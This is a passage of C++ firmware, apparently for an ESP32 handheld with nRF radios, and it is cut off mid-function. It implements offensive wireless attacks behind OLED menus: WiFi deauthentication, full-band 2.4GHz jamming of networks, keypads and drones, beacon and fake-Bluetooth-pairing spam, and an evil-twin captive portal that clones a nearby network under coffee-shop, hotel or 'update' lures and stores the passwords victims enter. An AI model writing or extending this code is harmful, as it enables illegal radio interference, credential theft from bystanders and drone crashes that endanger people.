    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gWifiTx.channel=ggWifiAPs[gSel].channel;
    if (gWifiFloodMode) {
      ggWifiDeauthMode = true;
      memcpy(ggWifiDeauthBssid, ggWifiAPs[gSel].bssid, 6);
      gWifiFloodMode=false;
      gWifiTx.pps=1000; gWifiTx.power=GG_WP_MAX; gWifiTx.frameSize=GG_WF_256; gWifiTx.durationSec=0;
    }
    ggWifiPickScanEnd();
    if (ggWifiDeauthMode) {
      ggClickFire();
      ggBack(); ggGo(GS_WIFI_TX_RUN);
    } else {
      ggBack();
    }
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu(gWifiFloodMode?"Flood target":"Pick network", p, ggWifiAPCount, gSel, gTop, gWifiFloodMode?"SEL=flood this ch":"SEL=use this channel");
}

// ---------------------------------------------------------------- BLE TX config
enum { B_SEND=0, B_PPS, B_PWR, B_CHAN, B_DUR, B_DATA, B_SCAN, B_FLOOD, B_SAVE, B_LOAD, B_CNT };
static const char* ggBleHint(int f) {
  switch (f) { case B_SEND:return "Start broadcasting"; case B_PPS:return "Packets per second";
    case B_PWR:return "TX strength"; case B_CHAN:return "ALL or single ch";
    case B_DUR:return "0=keep going"; case B_DATA:return "Edit BLE payload";
    case B_SCAN:return "See nearby BLE devs"; case B_FLOOD:return "Max BLE & blast!";
    case B_SAVE:return "Store to flash now"; case B_LOAD:return "Restore from flash"; } return "";
}
static inline void ggBleLabel(int f, char* o, size_t n) {
  switch (f) {
    case B_SEND: snprintf(o,n,"SEND NOW >"); break;
    case B_PPS:  snprintf(o,n,"Rate: %u pps", gBleTx.pps); break;
    case B_PWR:  snprintf(o,n,"Power: %s", GG_BP_NAME[gBleTx.power>3?3:gBleTx.power]); break;
    case B_CHAN: snprintf(o,n,"Channels: %s", GG_BC_NAME[gBleTx.channels>3?3:gBleTx.channels]); break;
    case B_DUR:  if (gBleTx.durationSec==0) snprintf(o,n,"Duration: CONT");
                 else snprintf(o,n,"Duration: %us", gBleTx.durationSec); break;
    case B_DATA: snprintf(o,n,"Payload: %02X%02X.. >",gBleTx.payload[0],gBleTx.payloadLen>1?gBleTx.payload[1]:0); break;
    case B_SCAN: snprintf(o,n,"Scan BLE >"); break;
    case B_FLOOD: snprintf(o,n,"Flood >"); break;
    case B_SAVE: snprintf(o,n,"Save config"); break;
    case B_LOAD: snprintf(o,n,"Load config"); break;
  }
}
static inline void ggBleAdjust(int f, int dir) {
  switch (f) {
    case B_PPS:  ggStepU16(gBleTx.pps,dir,10,1,500); break;
    case B_PWR:  ggCycle(gBleTx.power,4,dir); break;
    case B_CHAN: ggCycle(gBleTx.channels,4,dir); break;
    case B_DUR:  { int v=(int)gBleTx.durationSec+dir*10; if(v<0)v=0; if(v>300)v=300; gBleTx.durationSec=(uint16_t)v; break; }
  }
}
static inline void ggScreenBleTx() {
  if (gEditing) {
    if (gEv.up) ggBleAdjust(gSel,+1); if (gEv.down) ggBleAdjust(gSel,-1);
    if (gEv.sel||gEv.back) gEditing=false;
  } else {
    ggMove(0, B_CNT-1);
    if (gEv.back){ ggBack(); return; }
    if (gEv.sel) {
      switch (gSel) {
        case B_SEND: ggGo(GS_BLE_TX_RUN); return;
        case B_DATA: ggOpenBytes(gBleTx.payload, gBleTx.payloadLen, "BLE DATA", false, &gBleTx.payloadLen, 26); return;
        case B_SCAN: ggGo(GS_BLE_SCAN); return;
        case B_FLOOD:
          gBleTx.pps=500; gBleTx.power=GG_BP_MAX; gBleTx.channels=GG_BC_ALL; gBleTx.durationSec=0;
          ggBleFloodMode=true;
          ggClickFire(); ggGo(GS_BLE_TX_RUN); return;
        case B_SAVE: ggSaveBleTx(gBleTx); ggChirpUp(); break;
        case B_LOAD: if (ggLoadBleTx(gBleTx)) ggChirpDown(); break;
        default: gEditing=true; break;
      }
    }
  }
  static char rows[B_CNT][22]; const char* p[B_CNT];
  for (int i=0;i<B_CNT;i++){ ggBleLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu("BLE TX", p, B_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggBleHint(gSel));
}

// ---------------------------------------------------------------- BLE TX run
static inline void ggScreenBleTxRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    if (ggWifiTxRun)   ggWifiTxEnd();
    ggBleTxBegin(gBleTx);
    if (ggBleFloodMode) ggBleFloodNrfStart();
    gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggFloodNrfStop(); ggBleTxEnd(); ggBack(); return; }
  if (gBleTx.durationSec > 0) {
    uint32_t el = (millis()-ggBleTxStartMs)/1000;
    if (el >= gBleTx.durationSec) { ggFloodNrfStop(); ggBleTxEnd(); ggBack(); return; }
  }
  // flood mode: cycle MAC + restart advertising each frame
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  uint32_t elapsed = (millis()-ggBleTxStartMs)/1000;
  uint32_t pktEst = ggBlePktEst();
  uint32_t pps = elapsed > 0 ? pktEst / elapsed : 0;
  gPhase = pktEst/50;
  bool flood = ggBleFloodMode;
  ggOled.clearDisplay(); ggHeader(flood ? "BLE FLOOD" : "BLE TX");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  if (flood) {
    ggOled.setCursor(34,18); ggOled.print("3-RADIO BLE MAX");
  } else {
    ggOled.setCursor(34,18); ggOled.printf("%upps %s %s", gBleTx.pps, GG_BP_NAME[gBleTx.power>3?3:gBleTx.power], GG_BC_NAME[gBleTx.channels>3?3:gBleTx.channels]);
  }
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(pktEst)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45);
  if (flood && ggFloodNrfActive) {
    ggOled.printf("%lu/s nRF ch0-83",(unsigned long)pps);
  }
  else if (gBleTx.durationSec>0) { uint32_t left=gBleTx.durationSec>elapsed?gBleTx.durationSec-elapsed:0; ggOled.printf("%lu/s %lus left",(unsigned long)pps,(unsigned long)left); }
  else ggOled.printf("%lu/s %s %lus",(unsigned long)pps,GG_BC_NAME[gBleTx.channels>3?3:gBleTx.channels],(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- BLE scan (device picker)
static inline void ggScreenBleScan() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (!ggBlePickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("BLE Scan");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.setCursor(2,35); ggOled.printf("Found: %d", ggBlePickDevCount);
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggBlePickDevCount == 0) {
    ggOled.clearDisplay(); ggHeader("BLE Scan");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No devices found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggBlePickDevCount-1);
  static char rows[GG_BLE_PICK_MAX][22]; const char* p[GG_BLE_PICK_MAX];
  for (int i=0;i<ggBlePickDevCount;i++){
    snprintf(rows[i],22,"%.9s %ddBm",ggBlePickDevs[i].name,ggBlePickDevs[i].rssi);
    p[i]=rows[i];
  }
  ggMenu("BLE Scan", p, ggBlePickDevCount, gSel, gTop, "Nearby BLE devices");
}

// ---------------------------------------------------------------- FULL JAM (WiFi+BLE+nRF combined)
static uint8_t  gJamCh = 1;
static uint32_t gJamStartMs = 0;
static bool     gJamWifiUp = false;
static bool     gJamBleUp  = false;

static inline void ggScreenJamPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Jam target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning WiFi...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Jam target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gJamCh = ggWifiAPs[gSel].channel;
    memcpy(ggWifiDeauthBssid, ggWifiAPs[gSel].bssid, 6);
    ggWifiPickScanEnd();
    ggClickFire();
    ggBack(); ggGo(GS_JAM_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu("Jam target", p, ggWifiAPCount, gSel, gTop, "SEL=jam this channel");
}

static inline void ggScreenJamRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    // start WiFi probe flood
    gWifiTx.channel = gJamCh;
    gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gJamWifiUp = true;
    // start BLE flood
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gJamBleUp = true;
    // nRF wideband noise across target WiFi channel
    ggFloodNrfStart(gJamCh);
    gJamStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gJamWifiUp)  { ggWifiTxEnd(); gJamWifiUp = false; }
    if (gJamBleUp)   { ggBleFloodMode = false; ggBleTxEnd(); gJamBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  // BLE flood cycling
  if (ggBleFloodMode) ggBleFloodCycle();
  ggFloodNrfPump();
  // hop WiFi across all channels for full-band coverage
  { static uint32_t lastJamHop=0; static uint8_t jamHopCh=1; uint32_t n2=millis();
    if(n2-lastJamHop>=60){ lastJamHop=n2; jamHopCh++; if(jamHopCh>14)jamHopCh=1;
    gWifiTx.channel=jamHopCh; ggWifiTxSetChannel(jamHopCh, gWifiTx); } }
  uint32_t elapsed = (millis()-gJamStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("FULL JAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u SWEEPING", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s nRF%u-%u",wf,bf,ggFloodNrfChLo,ggFloodNrfChHi); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- KEYPAD BUSTER
// Sweeps nRF carriers across the full 2.4GHz band while flooding WiFi+BLE.
// Targets wireless keypads that use 2.4GHz (BLE, WiFi, or proprietary).
// nRF modules hop across the band in a fast sweep pattern to cover every freq.
static uint32_t gKpadStartMs = 0;
static bool     gKpadWifiUp = false;
static bool     gKpadBleUp  = false;

static inline void ggScreenKpadRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gKpadWifiUp = true;
    // BLE flood all channels
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gKpadBleUp = true;
    // nRF wideband noise — full 2.4GHz band sweep
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 0);
    if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 63);
    ggFloodNrfActive = true;
    gKpadStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gKpadWifiUp) { ggWifiTxEnd(); gKpadWifiUp = false; }
    if (gKpadBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gKpadBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  // pump nRF noise + hop channels every call
  ggFloodNrfPump();
  // BLE flood cycling
  if (ggBleFloodMode) ggBleFloodCycle();
  // hop WiFi between ch1, ch6, ch11 every 500ms
  uint32_t now = millis();
  static uint32_t lastWifiHop = 0;
  static uint8_t wifiHopIdx = 0;
  if (now - lastWifiHop >= 100) {
    lastWifiHop = now;
    static const uint8_t wHops[] = {1, 6, 11};
    wifiHopIdx = (wifiHopIdx + 1) % 3;
    gWifiTx.channel = wHops[wifiHopIdx];
    ggWifiTxSetChannel(gWifiTx.channel, gWifiTx);
  }
  uint32_t elapsed = (millis()-gKpadStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("KEYPAD BUST");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print("2.4G FULL SWEEP");
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s nRF%u+%u",wf,bf,ggFloodNrfPosA,ggFloodNrfPosB); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- RADIUS JAMMER
// Scans for ALL nearby networks, collects unique channels, then floods
// every channel by rapid-hopping. Hits multiple routers simultaneously.
static uint8_t  gRadChans[14];
static uint8_t  gRadChanCount = 0;
static uint32_t gRadStartMs = 0;
static bool     gRadWifiUp = false;
static bool     gRadBleUp  = false;
static uint8_t  gRadHopIdx = 0;

static inline void ggScreenRadPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Radius scan");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning all APs...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Radius scan");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  // auto-collect unique channels and start
  gRadChanCount = 0;
  for (int i = 0; i < ggWifiAPCount && gRadChanCount < 14; i++) {
    uint8_t ch = ggWifiAPs[i].channel;
    bool dup = false;
    for (int j = 0; j < gRadChanCount; j++) { if (gRadChans[j] == ch) { dup = true; break; } }
    if (!dup) gRadChans[gRadChanCount++] = ch;
  }
  ggWifiPickScanEnd();
  ggClickFire();
  ggBack(); ggGo(GS_RAD_RUN);
}

static inline void ggScreenRadRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = gRadChans[0]; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gRadWifiUp = true;
    // BLE flood
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gRadBleUp = true;
    // nRF wideband noise across full 2.4GHz band
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 0);
    if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 63);
    ggFloodNrfActive = true;
    gRadHopIdx = 0; gRadStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gRadWifiUp) { ggWifiTxEnd(); gRadWifiUp = false; }
    if (gRadBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gRadBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  ggFloodNrfPump();
  if (ggBleFloodMode) ggBleFloodCycle();
  // hop WiFi flood between ALL found channels
  uint32_t now = millis();
  static uint32_t lastRadHop = 0;
  uint32_t hopMs = (gRadChanCount > 1) ? (120 / gRadChanCount) : 120;
  if (hopMs < 30) hopMs = 30;
  if (now - lastRadHop >= hopMs) {
    lastRadHop = now;
    gRadHopIdx = (gRadHopIdx + 1) % gRadChanCount;
    gWifiTx.channel = gRadChans[gRadHopIdx];
    ggWifiTxSetChannel(gWifiTx.channel, gWifiTx);
  }
  uint32_t elapsed = (millis()-gRadStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("RADIUS JAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("%uAP %uch FLOOD",ggWifiAPCount,gRadChanCount);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s CH%u",wf,bf,gRadChans[gRadHopIdx]); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- BEACON SPAM
// Floods the air with fake WiFi SSIDs, each carrying a NAV reservation attack.
// Every nearby device's WiFi list fills with phantom networks.
static uint32_t gSpamStartMs = 0;
static inline void ggScreenSpamRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiSpamMode = true;
    ggSpamCount = 0;
    gWifiTx.channel = 1; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gSpamStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  { static uint32_t sLastHop=0; static uint8_t sHi=0; static const uint8_t sHC[]={1,6,11};
    if(millis()-sLastHop>=500){ sLastHop=millis(); sHi=(sHi+1)%3; gWifiTx.channel=sHC[sHi]; ggWifiTxSetChannel(sHC[sHi],gWifiTx); } }
  uint32_t cnt = ggSpamCount;
  uint32_t elapsed = (millis()-gSpamStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("BEACON SPAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u SSID+NAV", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu SSIDs/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- BLE SPAM
// Floods nearby phones with fake Apple/Beats device popups via BLE Proximity Pairing.
// Each cycle sends a different device model with a new MAC, triggering "device found
// nearby" notifications on iPhones and other Apple devices.
static uint32_t gBleSpamStartMs = 0;
static inline void ggScreenBleSpamRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggBleSpamMode = true;
    ggBleFloodMode = true;
    ggBleSpamCount = 0;
    gBleTx.power = GG_BP_MAX;
    gBleTx.channels = GG_BC_ALL;
    ggBleTxBegin(gBleTx);
    esp_ble_gap_stop_advertising();
    delay(10);
    ggBleSpamSetAny(0);
    delay(20);
    ggBleAdvP.adv_type = (ggBleSpamEffProto == GG_BSP_SWIFTPAIR) ? ADV_TYPE_IND : ADV_TYPE_NONCONN_IND;
    esp_ble_gap_start_advertising(&ggBleAdvP);
    delay(10);
    gBleSpamStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggBleTxEnd(); ggBack(); return; }
  ggBleSpamCycle();
  uint32_t cnt = ggBleSpamCount;
  uint32_t elapsed = (millis()-gBleSpamStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/20;
  const char* hdr;
  switch (ggBleSpamProto) {
    case GG_BSP_FASTPAIR:  hdr = "FAST PAIR"; break;
    case GG_BSP_SAMSUNG:   hdr = "SAMSUNG"; break;
    case GG_BSP_SWIFTPAIR: hdr = "SWIFT PAIR"; break;
    case GG_BSP_NAMES:     hdr = "NAME FLOOD"; break;
    case GG_BSP_ALL:       hdr = "ALL SPAM"; break;
    default:               hdr = "BLE SPAM"; break;
  }
  ggOled.clearDisplay(); ggHeader(hdr);
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print(ggBleSpamDevName(cnt & 0xFF));
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu devs/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- EVIL TWIN pick
static inline void ggScreenEvilPick() {
  const char* hdr = (ggPortalType==GG_PT_COFFEE)?"Coffee AP":
                    (ggPortalType==GG_PT_HOTEL) ?"Hotel AP":
                    (ggPortalType==GG_PT_UPDATE)?"Update AP":"Evil Twin";
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader(hdr);
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader(hdr);
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    ggWifiPickScanEnd();
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggClickFire();
    ggPortalBegin(ggWifiAPs[gSel].ssid, ggWifiAPs[gSel].channel);
    ggBack(); ggGo(GS_EVIL_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu(hdr, p, ggWifiAPCount, gSel, gTop, "SEL=clone & trap");
}

// ---------------------------------------------------------------- EVIL TWIN run
static uint32_t gEvilStartMs = 0;
static int gEvilLastCred = 0;
static inline void ggScreenEvilRun() {
  if (!gRunInit) { gEvilStartMs = millis(); gEvilLastCred = 0; gPhase = 0; gRunInit = true; }
  if (gEv.back) { ggPortalEnd(); ggBack(); return; }
  if (gEv.sel && ggCredCount > 0) {
    ggSaveCreds(ggCredStore, ggCredCount);
    ggClickOk();
  }
  ggPortalPump();
  if (ggCredCount > gEvilLastCred) { ggClickFire(); gEvilLastCred = ggCredCount; }
  uint32_t elapsed = (millis()-gEvilStartMs)/1000;
  gPhase++;
  const char* ehdr = (ggPortalType==GG_PT_COFFEE)?"COFFEE TRAP":
                     (ggPortalType==GG_PT_HOTEL) ?"HOTEL TRAP":
                     (ggPortalType==GG_PT_UPDATE)?"UPDATE TRAP":"EVIL TWIN";
  ggOled.clearDisplay(); ggHeader(ehdr);
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18);
  char ssidT[16]; snprintf(ssidT,16,"%.15s",ggPortalSsid);
  ggOled.print(ssidT);
  ggOled.setCursor(34,28);
  ggOled.printf("Cli:%u Cred:%u",ggPortalClients,ggCredCount);
  if (ggCredCount > 0) {
    ggOled.setCursor(34,38);
    char lu[13]; snprintf(lu,13,"%.12s",ggCredStore[ggCredCount-1].user);
    ggOled.print(lu);
  }
  ggOled.setCursor(2,45); ggOled.printf("Portal active  %lus",(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(ggCredCount>0?"BACK=stop SEL=save":"BACK=stop  waiting");
  ggOled.display();
}

// ---------------------------------------------------------------- DRONE DROP
// All three radios blast full 2.4GHz band. Cheap drones lose control link and
// drop. DJI/GPS drones enter RTH or hover then descend.
static uint32_t gDroneStartMs = 0;
static bool     gDroneWifiUp = false;
static bool     gDroneBleUp  = false;

static inline void ggScreenDroneRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gDroneWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gDroneBleUp = true;
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
